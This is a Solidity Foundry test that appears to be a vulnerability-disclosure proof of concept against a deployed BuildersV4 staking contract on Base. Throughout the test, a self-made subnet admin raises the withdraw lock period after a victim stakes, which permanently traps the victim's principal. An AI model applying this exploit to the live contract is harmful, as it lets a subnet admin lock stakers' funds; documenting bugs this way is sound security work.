// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {IERC20Min, IBuildersV4Min, Subnet, SubnetMetadata} from "../src/Interfaces.sol";

/**
 * @title NV-1 PoC — BuildersV4 subnet admin can permanently lock stakers' principal
 *
 * Target:  BuildersV4 proxy 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9 on Base (chainId 8453),
 *          forked at block 58391435.
 *
 * Defect:  `deposit()` records only the stake amount and a `lastDeposit` timestamp — the
 *          withdraw lock period is NOT snapshotted per staker. `withdraw()` reads the lock
 *          period from the live Subnet struct, and `editSubnet()` lets the subnet admin
 *          replace that struct at any time. `_validateSubnet()` enforces only a LOWER bound
 *          (>= minimalWithdrawLockPeriod, 7 days) on `withdrawLockPeriodAfterDeposit` and no
 *          upper bound. A subnet admin — a role any address acquires permissionlessly through
 *          the public `createSubnet()` — can therefore raise the lock period after third
 *          parties have staked, retroactively making every existing staker's principal
 *          unreachable. There is no other principal-exit path in the contract.
 *
 * Actors:  three fresh, unprivileged addresses. `attacker` becomes a subnet admin only by
 *          calling the public createSubnet(); `victim` stakes into that subnet;
 *          `controlAdmin`/`controlStaker` run the identical flow on a second subnet whose
 *          admin never edits anything. No account is pranked as a protocol owner, admin of
 *          the protocol, or multisig anywhere in this test.
 *
 * Run:     BASE_RPC_URL=<base mainnet rpc> forge test
 */
contract NV1SubnetLockTest is Test {
    uint256 internal constant PINNED_BLOCK = 58391435;

    IBuildersV4Min internal constant BUILDERS = IBuildersV4Min(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9);
    IERC20Min internal constant MOR = IERC20Min(0x7431aDa8a591C955a994a21710752EF9b882b8e3);

    address internal attacker = address(0xA77AC6);
    address internal victim = address(0xB1C71);
    address internal controlAdmin = address(0xC047201);
    address internal controlStaker = address(0xC047202);

    uint256 internal constant STAKE = 500 ether; // 500 MOR per staker
    uint256 internal constant FUNDS = 1_000 ether; // dealt to each staker
    uint128 internal constant INITIAL_LOCK = 604800; // 7 days == minimalWithdrawLockPeriod on-chain

    string internal constant ATTACK_NAME = "NV1 PoC Attack Subnet 7f3a";
    string internal constant CONTROL_NAME = "NV1 PoC Control Subnet 7f3a";

    function _subnet(string memory name, address admin, uint128 lock) internal pure returns (Subnet memory) {
        return Subnet({
            name: name,
            admin: admin,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: lock,
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1 ether,
            claimAdmin: admin
        });
    }

    function _metadata() internal pure returns (SubnetMetadata memory) {
        return SubnetMetadata({slug: "", description: "", website: "", image: ""});
    }

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_RPC_URL"), PINNED_BLOCK);
    }

    function test_SubnetAdminPermanentlyLocksStakerPrincipal() public {
        // Sanity: the fork is the deployed contract, at the terms the victim will see.
        assertEq(BUILDERS.minimalWithdrawLockPeriod(), INITIAL_LOCK, "minimal lock is 7 days");
        assertEq(BUILDERS.subnetCreationFeeAmount(), 0, "subnet creation is free");

        bytes32 attackId = BUILDERS.getSubnetId(ATTACK_NAME);
        bytes32 controlId = BUILDERS.getSubnetId(CONTROL_NAME);

        // --- Setup: attacker creates a subnet through the public, permissionless route ---
        vm.prank(attacker);
        BUILDERS.createSubnet(_subnet(ATTACK_NAME, attacker, INITIAL_LOCK), _metadata());

        // --- Setup: control subnet, identical terms, admin who never edits ---
        vm.prank(controlAdmin);
        BUILDERS.createSubnet(_subnet(CONTROL_NAME, controlAdmin, INITIAL_LOCK), _metadata());

        // --- Victim stakes 500 MOR under the 7-day lock in force at deposit time ---
        deal(address(MOR), victim, FUNDS);
        uint256 victimBefore = MOR.balanceOf(victim);
        vm.startPrank(victim);
        MOR.approve(address(BUILDERS), type(uint256).max);
        BUILDERS.deposit(attackId, STAKE);
        vm.stopPrank();
        assertEq(MOR.balanceOf(victim), victimBefore - STAKE, "victim balance drops by the stake");
        (, , uint256 victimDeposited, ) = BUILDERS.usersData(victim, attackId);
        assertEq(victimDeposited, STAKE, "victim stake recorded");

        // --- Control staker stakes 500 MOR under identical terms ---
        deal(address(MOR), controlStaker, FUNDS);
        vm.startPrank(controlStaker);
        MOR.approve(address(BUILDERS), type(uint256).max);
        BUILDERS.deposit(controlId, STAKE);
        vm.stopPrank();

        uint256 buildersBalanceAfterDeposits = MOR.balanceOf(address(BUILDERS));

        // --- ATTACK: one editSubnet call raises the lock to 2^127 seconds (~5e30 years).
        //     Validation accepts it: _validateSubnet checks only the 7-day floor. ---
        vm.prank(attacker);
        BUILDERS.editSubnet(attackId, _subnet(ATTACK_NAME, attacker, uint128(2 ** 127)));
        (, , , uint128 lockAfterEdit, , , ) = BUILDERS.subnets(attackId);
        assertEq(lockAfterEdit, uint128(2 ** 127), "lock period replaced with 2^127 seconds");

        // --- Time passes: 8 days — beyond the 7-day lock the victim agreed to ---
        vm.warp(block.timestamp + 8 days);

        // CONTROL assertion: on the unedited subnet the staker exits in full.
        uint256 controlBefore = MOR.balanceOf(controlStaker);
        vm.prank(controlStaker);
        BUILDERS.withdraw(controlId, STAKE);
        assertEq(MOR.balanceOf(controlStaker), controlBefore + STAKE, "control staker recovers full principal");
        (, , uint256 controlDeposited, ) = BUILDERS.usersData(controlStaker, controlId);
        assertEq(controlDeposited, 0, "control stake fully withdrawn");

        // ATTACK assertion 1: the victim cannot withdraw, although the lock period in
        // force at their deposit (7 days) has fully elapsed.
        vm.startPrank(victim);
        vm.expectRevert();
        BUILDERS.withdraw(attackId, STAKE);
        vm.stopPrank();

        // --- A further 100 years pass. The lock still has ~2^127 seconds to run. ---
        vm.warp(block.timestamp + 36500 days);
        vm.startPrank(victim);
        vm.expectRevert();
        BUILDERS.withdraw(attackId, STAKE);
        vm.stopPrank();

        // --- ATTACK assertion 2: the admin pushes the field to its uint128 maximum,
        //     which validation also accepts; withdraw now fails on the deadline
        //     arithmetic itself. Still no exit. ---
        vm.prank(attacker);
        BUILDERS.editSubnet(attackId, _subnet(ATTACK_NAME, attacker, type(uint128).max));
        vm.startPrank(victim);
        vm.expectRevert();
        BUILDERS.withdraw(attackId, STAKE);
        vm.stopPrank();

        // --- LOSS, asserted numerically ---
        // The victim is short exactly their staked principal versus before the deposit.
        assertEq(MOR.balanceOf(victim), victimBefore - STAKE, "victim is short exactly the 500 MOR principal");
        // The stake is still recorded against the victim and still sits inside BuildersV4:
        // the contract's MOR balance fell only by the control staker's legitimate exit.
        (, , uint256 victimDepositedEnd, ) = BUILDERS.usersData(victim, attackId);
        assertEq(victimDepositedEnd, STAKE, "victim principal still recorded as deposited");
        assertEq(
            MOR.balanceOf(address(BUILDERS)),
            buildersBalanceAfterDeposits - STAKE,
            "BuildersV4 still holds the victim principal (only the control exit left)"
        );
        (, uint256 attackSubnetDeposited, , , ) = BUILDERS.subnetsData(attackId);
        assertEq(attackSubnetDeposited, STAKE, "attack subnet still carries the victim stake");
        assertTrue(attackSubnetDeposited > 0, "locked principal is non-zero");
    }
}
